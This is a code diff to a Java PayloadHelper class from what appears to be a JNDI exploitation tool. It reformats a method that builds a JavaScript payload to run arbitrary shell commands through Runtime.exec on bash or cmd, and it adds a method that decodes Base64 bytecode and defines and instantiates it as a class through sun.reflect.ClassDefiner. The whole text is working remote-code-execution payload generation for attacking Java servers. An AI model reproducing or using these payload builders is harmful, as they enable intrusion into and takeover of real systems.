@@ -220,17 +220,27 @@ public class PayloadHelper {
 
     // https://github.com/zzwlpx/JNDIExploit/blob/7aa2b5f8ab742cf8e705c965ab3e8bac6fe312b0/src/main/java/com/feihong/ldap/controllers/TomcatBypassController.java?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L135
     public static String makeJsRuntimeExecPayload(String cmd){
-        return "var strs=new Array(3);\n" +
-                "        if(java.io.File.separator.equals('/')){\n" +
-                "            strs[0]='/bin/bash';\n" +
-                "            strs[1]='-c';\n" +
-                "            strs[2]='" + cmd + "';\n" +
-                "        }else{\n" +
-                "            strs[0]='cmd';\n" +
-                "            strs[1]='/C';\n" +
-                "            strs[2]='" + cmd + "';\n" +
-                "        }\n" +
-                "        java.lang.Runtime.getRuntime().exec(strs);";
+        return "var strs=new Array(3);" +
+                "if(java.io.File.separator.equals('/')){" +
+                "strs[0]='/bin/bash';" +
+                "strs[1]='-c';" +
+                "strs[2]='" + cmd + "';" +
+                "}else{" +
+                "strs[0]='cmd';" +
+                "strs[1]='/C';" +
+                "strs[2]='" + cmd + "';" +
+                "}" +
+                "java.lang.Runtime.getRuntime().exec(strs);";
+    }
+
+    public static String makeJsDefinedClass(String classname, String encoded){
+        return "var data = '"+encoded+"';" +
+                "var bytes = java.util.Base64.getDecoder().decode(data);" +
+                "var cls = java.lang.Class.forName('sun.reflect.ClassDefiner');" +
+                "var method = cls.getDeclaredMethods()[0];" +
+                "method.setAccessible(true);" +
+                "var evil = method.invoke(cls, '"+classname+"', bytes, 0, bytes.length, cls.getClassLoader());" +
+                "evil.newInstance();";
     }
 
 
